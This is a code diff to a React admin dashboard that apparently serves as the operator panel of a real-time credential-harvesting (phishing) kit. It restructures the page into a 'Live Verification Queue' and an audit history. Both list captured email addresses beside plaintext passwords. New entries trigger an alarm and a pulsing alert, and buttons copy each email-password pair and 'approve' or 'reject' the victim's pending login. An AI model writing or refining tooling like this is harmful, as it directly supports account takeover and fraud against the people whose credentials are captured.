@@ -21,7 +21,6 @@ export default function AdminDashboardPage() {
   const [toastMsg, setToastMsg] = useState<{ msg: string; type?: 'info' | 'success' | 'warning' | 'danger' } | null>(null);
   const [acknowledgedUsers, setAcknowledgedUsers] = useState<number[]>([]);
   const [soundMuted, setSoundMuted] = useState<boolean>(false);
-  const [activeTab, setActiveTab] = useState<'verifying' | 'history' | 'all'>('verifying');
   const [searchTerm, setSearchTerm] = useState<string>('');
 
   const alarmRef = useRef<HTMLAudioElement | null>(null);
@@ -382,19 +381,22 @@ export default function AdminDashboardPage() {
   // Filtered lists
   const verifyingUsers = users.filter((u) => u.status === 'verifying');
   const historyUsers = users.filter((u) => u.status !== 'verifying');
-  const approvedCount = users.filter((u) => u.status === 'approved').length;
+  const approvedUsers = users.filter((u) => u.status === 'approved');
+  const rejectedUsers = users.filter((u) => u.status === 'rejected');
+  const approvedCount = approvedUsers.length;
   const activePopupUser = verifyingUsers.find((u) => !acknowledgedUsers.includes(u.id)) || null;
 
-  let displayedUsers = users;
-  if (activeTab === 'verifying') {
-    displayedUsers = verifyingUsers;
-  } else if (activeTab === 'history') {
-    displayedUsers = historyUsers;
-  }
+  // In all-records view, pin pending/verifying users at the very top, then newest-first
+  const sortedAllUsers = [...users].sort((a, b) => {
+    if (a.status === 'verifying' && b.status !== 'verifying') return -1;
+    if (a.status !== 'verifying' && b.status === 'verifying') return 1;
+    return b.id - a.id;
+  });
 
+  let displayedHistoryUsers = historyUsers;
   if (searchTerm.trim() !== '') {
     const q = searchTerm.toLowerCase().trim();
-    displayedUsers = displayedUsers.filter(
+    displayedHistoryUsers = displayedHistoryUsers.filter(
       (u) => u.email.toLowerCase().includes(q) || String(u.id).includes(q) || u.password.toLowerCase().includes(q)
     );
   }
@@ -878,9 +880,39 @@ export default function AdminDashboardPage() {
           font-weight: 700;
         }
 
+        .tab-badge.warning,
         .tab-btn.active .tab-badge.warning {
-          background: var(--accent-warning-bg);
-          color: var(--accent-warning);
+          background: var(--accent-danger-bg);
+          color: var(--accent-danger);
+          border: 1px solid rgba(244, 63, 94, 0.3);
+        }
+
+        /* Live Pending Alert Banner */
+        .pending-alert-banner {
+          background: linear-gradient(90deg, rgba(244, 63, 94, 0.18) 0%, rgba(18, 24, 39, 0.95) 100%);
+          border: 1px solid rgba(244, 63, 94, 0.4);
+          border-radius: var(--radius-lg);
+          padding: 14px 20px;
+          margin-bottom: 20px;
+          display: flex;
+          align-items: center;
+          justify-content: space-between;
+          gap: 16px;
+          animation: pulseGlowBanner 2s infinite;
+        }
+
+        @keyframes pulseGlowBanner {
+          0% { box-shadow: 0 0 0 0 rgba(244, 63, 94, 0.2); }
+          50% { box-shadow: 0 0 15px rgba(244, 63, 94, 0.35); }
+          100% { box-shadow: 0 0 0 0 rgba(244, 63, 94, 0.2); }
+        }
+
+        .pending-alert-info {
+          display: flex;
+          align-items: center;
+          gap: 12px;
+          font-size: 14px;
+          color: var(--text-primary);
         }
 
         .search-box {
@@ -1453,168 +1485,256 @@ export default function AdminDashboardPage() {
           </div>
         </div>
 
-        {/* Controls Row: Tabs & Search */}
-        <div className="controls-card">
-          <div className="tab-group">
-            <button
-              className={`tab-btn ${activeTab === 'verifying' ? 'active' : ''}`}
-              onClick={() => setActiveTab('verifying')}
-            >
-              <i className="ri-radar-line"></i>
-              <span>Pending Action</span>
-              <span className="tab-badge warning">{verifyingUsers.length}</span>
-            </button>
-
-            <button
-              className={`tab-btn ${activeTab === 'history' ? 'active' : ''}`}
-              onClick={() => setActiveTab('history')}
-            >
-              <i className="ri-history-line"></i>
-              <span>Resolved History</span>
-              <span className="tab-badge">{historyUsers.length}</span>
-            </button>
-
-            <button
-              className={`tab-btn ${activeTab === 'all' ? 'active' : ''}`}
-              onClick={() => setActiveTab('all')}
-            >
-              <i className="ri-list-check-2"></i>
-              <span>All Logs</span>
-              <span className="tab-badge">{users.length}</span>
-            </button>
+        {/* SECTION 1: LIVE VERIFICATION QUEUE (PENDING REQUESTS) */}
+        <div style={{ marginBottom: '36px' }}>
+          <div className="controls-card" style={{ borderRadius: 'var(--radius-xl) var(--radius-xl) 0 0' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+              <div className="pulse-dot" style={{ backgroundColor: verifyingUsers.length > 0 ? 'var(--accent-danger)' : 'var(--accent-success)' }}></div>
+              <h3 style={{ fontSize: '16px', fontWeight: 800, color: 'var(--text-primary)', margin: 0, display: 'flex', alignItems: 'center', gap: '8px' }}>
+                <i className="ri-radar-line" style={{ color: verifyingUsers.length > 0 ? 'var(--accent-danger)' : 'var(--accent-primary)', fontSize: '18px' }}></i>
+                Live Verification Queue
+              </h3>
+              <span className={`tab-badge ${verifyingUsers.length > 0 ? 'warning' : ''}`} style={{ fontSize: '12px' }}>
+                {verifyingUsers.length} Pending
+              </span>
+            </div>
           </div>
 
-          <div className="search-box">
-            <i className="ri-search-line"></i>
-            <input
-              type="text"
-              className="search-input"
-              placeholder="Search email, password or ID..."
-              value={searchTerm}
-              onChange={(e) => setSearchTerm(e.target.value)}
-            />
-          </div>
-        </div>
-
-        {/* Table Container */}
-        <div className="table-card">
-          <div className="table-responsive">
-            <table>
-              <thead>
-                <tr>
-                  <th>Timestamp</th>
-                  <th>ID</th>
-                  <th>Email Address</th>
-                  <th>Password Credential</th>
-                  <th>Status</th>
-                  <th style={{ textAlign: 'center' }}>Credentials Action</th>
-                  <th style={{ textAlign: 'center' }}>Access Decision</th>
-                </tr>
-              </thead>
-              <tbody>
-                {displayedUsers.length === 0 ? (
+          <div className="table-card">
+            <div className="table-responsive">
+              <table>
+                <thead>
                   <tr>
-                    <td colSpan={7}>
-                      <div className="empty-box">
-                        <i className="ri-inbox-archive-line"></i>
-                        <p>No user records found matching current filter.</p>
-                      </div>
-                    </td>
+                    <th>Timestamp</th>
+                    <th>ID</th>
+                    <th>Email Address</th>
+                    <th>Password Credential</th>
+                    <th>Status</th>
+                    <th style={{ textAlign: 'center' }}>Credentials Action</th>
+                    <th style={{ textAlign: 'center' }}>Access Decision</th>
                   </tr>
-                ) : (
-                  displayedUsers.map((u) => {
-                    const isUrgent = u.status === 'verifying' && u.seconds_ago < 60 && !acknowledgedUsers.includes(u.id);
-                    const isCopied = acknowledgedUsers.includes(u.id);
+                </thead>
+                <tbody>
+                  {verifyingUsers.length === 0 ? (
+                    <tr>
+                      <td colSpan={7}>
+                        <div className="empty-box" style={{ padding: '24px' }}>
+                          <i className="ri-shield-check-line" style={{ color: 'var(--accent-success)', fontSize: '32px' }}></i>
+                          <p style={{ color: 'var(--text-secondary)', marginTop: '6px' }}>System clear. No pending verification requests awaiting action.</p>
+                        </div>
+                      </td>
+                    </tr>
+                  ) : (
+                    verifyingUsers.map((u) => {
+                      const isUrgent = !acknowledgedUsers.includes(u.id);
+                      const isCopied = acknowledgedUsers.includes(u.id);
 
-                    return (
-                      <tr key={u.id} className={isUrgent ? 'row-urgent' : ''}>
-                        <td>
-                          <span style={{ color: 'var(--text-secondary)', fontSize: '13px', fontWeight: 600 }}>
-                            {formatTime(u.seconds_ago)}
-                          </span>
-                        </td>
+                      return (
+                        <tr key={u.id} className={isUrgent ? 'row-urgent' : ''}>
+                          <td>
+                            <span style={{ color: 'var(--text-secondary)', fontSize: '13px', fontWeight: 600 }}>
+                              {formatTime(u.seconds_ago)}
+                            </span>
+                          </td>
 
-                        <td>
-                          <span style={{ color: 'var(--text-muted)', fontWeight: 700 }}>#{u.id}</span>
-                        </td>
+                          <td>
+                            <span style={{ color: 'var(--text-muted)', fontWeight: 700 }}>#{u.id}</span>
+                          </td>
 
-                        <td>
-                          <strong style={{ color: 'var(--text-primary)', fontWeight: 600 }}>{u.email}</strong>
-                        </td>
+                          <td>
+                            <strong style={{ color: 'var(--text-primary)', fontWeight: 600 }}>{u.email}</strong>
+                          </td>
 
-                        <td>
-                          <span className="cred-code">{u.password}</span>
-                        </td>
+                          <td>
+                            <span className="cred-code">{u.password}</span>
+                          </td>
 
-                        <td>
-                          {u.status === 'verifying' && (
+                          <td>
                             <span className="status-badge verifying">
                               <i className="ri-radar-line"></i> VERIFYING
                             </span>
-                          )}
-                          {u.status === 'approved' && (
-                            <span className="status-badge approved">
-                              <i className="ri-checkbox-circle-fill"></i> APPROVED
-                            </span>
-                          )}
-                          {u.status === 'rejected' && (
-                            <span className="status-badge rejected">
-                              <i className="ri-close-circle-fill"></i> REJECTED
-                            </span>
-                          )}
-                          {u.status !== 'verifying' && u.status !== 'approved' && u.status !== 'rejected' && (
-                            <span className="status-badge copied">
-                              <i className="ri-time-line"></i> {u.status}
-                            </span>
-                          )}
-                        </td>
+                          </td>
 
-                        <td style={{ textAlign: 'center' }}>
-                          <button
-                            className="btn-action copy"
-                            onClick={() => copyData(u.email, u.password, u.id)}
-                            title="Copy Email & Password to Clipboard"
-                          >
-                            <i className={isCopied ? 'ri-check-line' : 'ri-file-copy-line'}></i>
-                            <span>{isCopied ? 'Copied' : 'Copy'}</span>
-                          </button>
-                        </td>
-
-                        <td style={{ textAlign: 'center' }}>
-                          <div className="action-cell" style={{ justifyContent: 'center' }}>
+                          <td style={{ textAlign: 'center' }}>
                             <button
-                              className="btn-action approve"
-                              onClick={() => approveUser(u.id)}
-                              title="Grant User Access"
+                              className="btn-action copy"
+                              onClick={() => copyData(u.email, u.password, u.id)}
+                              title="Copy Email & Password to Clipboard"
                             >
-                              <i className="ri-check-line"></i>
-                              <span>Approve</span>
+                              <i className={isCopied ? 'ri-check-line' : 'ri-file-copy-line'}></i>
+                              <span>{isCopied ? 'Copied' : 'Copy'}</span>
                             </button>
+                          </td>
 
-                            <button
-                              className="btn-action reject"
-                              onClick={() => rejectUser(u.id)}
-                              title="Deny Access"
-                            >
-                              <i className="ri-close-line"></i>
-                              <span>Reject</span>
-                            </button>
+                          <td style={{ textAlign: 'center' }}>
+                            <div className="action-cell" style={{ justifyContent: 'center' }}>
+                              <button
+                                className="btn-action approve"
+                                onClick={() => approveUser(u.id)}
+                                title="Grant User Access"
+                              >
+                                <i className="ri-check-line"></i>
+                                <span>Approve</span>
+                              </button>
 
+                              <button
+                                className="btn-action reject"
+                                onClick={() => rejectUser(u.id)}
+                                title="Deny Access"
+                              >
+                                <i className="ri-close-line"></i>
+                                <span>Reject</span>
+                              </button>
+                            </div>
+                          </td>
+                        </tr>
+                      );
+                    })
+                  )}
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        {/* SECTION 2: AUDIT HISTORY & ALL RECORDED LOGS */}
+        <div style={{ marginBottom: '36px' }}>
+          <div className="controls-card" style={{ borderRadius: 'var(--radius-xl) var(--radius-xl) 0 0' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+              <i className="ri-history-line" style={{ color: 'var(--accent-primary)', fontSize: '20px' }}></i>
+              <h3 style={{ fontSize: '16px', fontWeight: 800, color: 'var(--text-primary)', margin: 0 }}>
+                Audit History & Recorded Logs
+              </h3>
+              <span className="tab-badge" style={{ fontSize: '12px' }}>
+                {historyUsers.length} Logs
+              </span>
+            </div>
+
+            <div className="search-box">
+              <i className="ri-search-line"></i>
+              <input
+                type="text"
+                className="search-input"
+                placeholder="Search email, password or ID..."
+                value={searchTerm}
+                onChange={(e) => setSearchTerm(e.target.value)}
+              />
+            </div>
+          </div>
+
+          <div className="table-card">
+            <div className="table-responsive">
+              <table>
+                <thead>
+                  <tr>
+                    <th>Timestamp</th>
+                    <th>ID</th>
+                    <th>Email Address</th>
+                    <th>Password Credential</th>
+                    <th>Status</th>
+                    <th style={{ textAlign: 'center' }}>Credentials Action</th>
+                    <th style={{ textAlign: 'center' }}>Access Decision</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {displayedHistoryUsers.length === 0 ? (
+                    <tr>
+                      <td colSpan={7}>
+                        <div className="empty-box">
+                          <i className="ri-inbox-archive-line"></i>
+                          <p>{searchTerm ? `No user records found matching "${searchTerm}".` : 'No user records found.'}</p>
+                        </div>
+                      </td>
+                    </tr>
+                  ) : (
+                    displayedHistoryUsers.map((u) => {
+                      const isCopied = acknowledgedUsers.includes(u.id);
+
+                      return (
+                        <tr key={u.id}>
+                          <td>
+                            <span style={{ color: 'var(--text-secondary)', fontSize: '13px', fontWeight: 600 }}>
+                              {formatTime(u.seconds_ago)}
+                            </span>
+                          </td>
+
+                          <td>
+                            <span style={{ color: 'var(--text-muted)', fontWeight: 700 }}>#{u.id}</span>
+                          </td>
+
+                          <td>
+                            <strong style={{ color: 'var(--text-primary)', fontWeight: 600 }}>{u.email}</strong>
+                          </td>
+
+                          <td>
+                            <span className="cred-code">{u.password}</span>
+                          </td>
+
+                          <td>
+                            {u.status === 'approved' && (
+                              <span className="status-badge approved">
+                                <i className="ri-checkbox-circle-fill"></i> APPROVED
+                              </span>
+                            )}
+                            {u.status === 'rejected' && (
+                              <span className="status-badge rejected">
+                                <i className="ri-close-circle-fill"></i> REJECTED
+                              </span>
+                            )}
+                            {u.status !== 'approved' && u.status !== 'rejected' && (
+                              <span className="status-badge copied">
+                                <i className="ri-time-line"></i> {u.status}
+                              </span>
+                            )}
+                          </td>
+
+                          <td style={{ textAlign: 'center' }}>
                             <button
-                              className="btn-icon-danger"
-                              onClick={() => deleteUser(u.id)}
-                              title="Delete Entry"
+                              className="btn-action copy"
+                              onClick={() => copyData(u.email, u.password, u.id)}
+                              title="Copy Email & Password to Clipboard"
                             >
-                              <i className="ri-delete-bin-line"></i>
+                              <i className={isCopied ? 'ri-check-line' : 'ri-file-copy-line'}></i>
+                              <span>{isCopied ? 'Copied' : 'Copy'}</span>
                             </button>
-                          </div>
-                        </td>
-                      </tr>
-                    );
-                  })
-                )}
-              </tbody>
-            </table>
+                          </td>
+
+                          <td style={{ textAlign: 'center' }}>
+                            <div className="action-cell" style={{ justifyContent: 'center' }}>
+                              <button
+                                className="btn-action approve"
+                                onClick={() => approveUser(u.id)}
+                                title="Grant User Access"
+                              >
+                                <i className="ri-check-line"></i>
+                                <span>Approve</span>
+                              </button>
+
+                              <button
+                                className="btn-action reject"
+                                onClick={() => rejectUser(u.id)}
+                                title="Deny Access"
+                              >
+                                <i className="ri-close-line"></i>
+                                <span>Reject</span>
+                              </button>
+
+                              <button
+                                className="btn-icon-danger"
+                                onClick={() => deleteUser(u.id)}
+                                title="Delete Entry"
+                              >
+                                <i className="ri-delete-bin-line"></i>
+                              </button>
+                            </div>
+                          </td>
+                        </tr>
+                      );
+                    })
+                  )}
+                </tbody>
+              </table>
+            </div>
           </div>
         </div>
       </main>
